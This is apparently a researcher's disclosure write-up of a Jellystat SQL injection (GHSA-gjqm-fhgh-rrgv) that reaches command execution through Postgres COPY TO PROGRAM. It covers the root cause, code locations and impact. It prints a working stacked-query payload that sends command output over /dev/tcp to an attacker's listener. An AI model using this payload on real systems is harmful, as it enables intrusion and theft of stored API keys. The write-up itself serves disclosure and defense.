---
title: "GHSA-gjqm-fhgh-rrgv"
date: 2026-09-08 11:00:00 -0500
categories: [CVE, '2026']
tags: [ghsa, ghsa-gjqm-fhgh-rrgv, jellystat, jellyfin, sql-injection, sqli, os-command-injection, rce, postgres, copy-to-program, web-security, exploit-development, red-team, offensive-security, vulnerability-research, application-security]
image:
  path: https://raw.githubusercontent.com/CyferShepard/Jellystat/main/public/icon-b-512.png
  alt: Jellystat SQL injection to RCE advisory
---

# [GHSA-gjqm-fhgh-rrgv](https://github.com/CyferShepard/Jellystat/security/advisories/GHSA-gjqm-fhgh-rrgv) — Jellystat SQL Injection to RCE

- Infinit3i

This is another one I found and reported. **Jellystat** is a self-hosted statistics dashboard for Jellyfin, and it turns out three of its "purge" endpoints will happily run whatever SQL you feed them — which, on a default install, is a straight line to running OS commands on the database host as a Postgres superuser. Any logged-in user can pull it off.

It's published as GHSA-gjqm-fhgh-rrgv with a CVSS v4.0 score of 9.4 (critical). GitHub tagged it under two weaknesses: OS command injection (CWE-78) and SQL injection (CWE-89). It affects Jellystat up to and including 1.1.11, and at the time of writing there's no patched release. No CVE was assigned.

## Where it goes wrong

Jellystat has a few DELETE routes for purging library data — `/api/library/purge`, `/api/libraryItems/purge`, and `/api/item/purge`. Each of them takes an `id` from the request body and drops it straight into a SQL string:

```js
"NowPlayingItemId"='${id}'
```

No parameterization, no escaping — just string concatenation. And because that query gets handed to node-postgres without a values array, it goes out over the *simple query protocol*, which happily allows stacked statements separated by semicolons. So I'm not limited to breaking out of that one string; I can tack on entirely new SQL statements of my own.

The unsafe spots live in `backend/routes/api.js` (lines 142 and 1131 for the interpolation, with the route handlers at 1156 and 1184), and the query fires without parameters over in `backend/db.js:191`.

## From injection to command execution

SQL injection is bad on its own, but this goes further. PostgreSQL has a `COPY ... TO PROGRAM` feature that runs a shell command on the database server — and it's available to superusers. In a standard Jellystat container the app connects to Postgres *as* a superuser, so once I can inject stacked statements, I can just ask the database to run commands for me.

The whole thing plays out like this:

1. I authenticate — any valid account or API key works, there's no special privilege needed.
2. I send a DELETE to one of the purge endpoints with a malicious `id`.
3. That `id` closes out the intended string and appends my own `COPY (SELECT 1) TO PROGRAM '...'` statement.
4. Postgres, running as superuser, executes my command on the database host.

A payload looks like:

```
x'; COPY (SELECT 1) TO PROGRAM 'bash -c "id > /dev/tcp/<lhost>/<lport>"'; --
```

That runs `id` and pipes the output back to a listener I control — command execution confirmed, out of band.

## Proof of concept

I wrote a Python PoC (`poc_1_purge_sqli_rce.py`) that runs the full chain:

```
python3 poc_1_purge_sqli_rce.py --base http://target:3000 --username admin --password admin
```

It logs in, opens a local listener, fires the command-execution payload through the purge endpoint, and catches the out-of-band output — proving RCE end to end.

One nasty detail: the exploit is basically silent. The endpoint returns the same fixed success response no matter what SQL actually ran, so from the outside there's no obvious sign anything went sideways.

## Why it matters

This is about as bad as it gets for a self-hosted app. A single low-privileged account gets you arbitrary command execution as the Postgres superuser (`uid=999` in the standard container), full run of the database — including the `jf_users` table and stored Jellyfin API keys — and from those keys, a pivot straight into the connected Jellyfin server. There's no privilege boundary in front of any of it; a regular user has the exact same access to this attack surface as an admin.

The root cause is the oldest one in the book — string-concatenated SQL — but the reason it's a 9.4 instead of a 6-something is everything stacked behind it: the simple query protocol allowing stacked statements, a superuser database connection, and `COPY ... TO PROGRAM` sitting right there ready to use. Parameterize the query and the whole chain never gets started.

[^GHSA]: [GitHub Security Advisory GHSA-gjqm-fhgh-rrgv](https://github.com/CyferShepard/Jellystat/security/advisories/GHSA-gjqm-fhgh-rrgv)
